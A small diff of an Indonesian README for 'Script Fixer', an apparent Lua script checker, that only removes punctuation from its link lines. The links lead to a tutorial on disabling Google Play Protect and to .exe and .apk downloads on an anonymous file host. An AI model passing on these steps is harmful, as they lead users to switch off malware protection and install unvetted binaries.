@@ -15,8 +15,8 @@ Apa itu Script Fixer? Script Fixer adalah suatu aplikasi yang bisa mengetahui ap
 - Setelah Script Fixer terbuka kalian bisa langsung put file .lua kalian kedalam aplikasi Script Fixer tersebut dan tekan execute untuk mengetahui apa yang salah dalam script tersebut.
 
 ## LINK TAB
-Tutorial Matiin Play Protect Disini! [TUTORIAL PLAY PROTECT](https://youtu.be/AqUN7vMi3Gs?si=hVFPIPiQJJ-lZVWI).
+Tutorial Matiin Play Protect Disini [TUTORIAL PLAY PROTECT](https://youtu.be/AqUN7vMi3Gs?si=hVFPIPiQJJ-lZVWI).
 
-App PC Device! [PC](https://www.upload.ee/files/15792008/ScriptFixer.exe.html).
+App PC Device [PC](https://www.upload.ee/files/15792008/ScriptFixer.exe.html).
 
-App Android Device! [ANDROID](https://www.upload.ee/files/15792013/ScriptFixer.apk.html).
+App Android Device [ANDROID](https://www.upload.ee/files/15792013/ScriptFixer.apk.html).
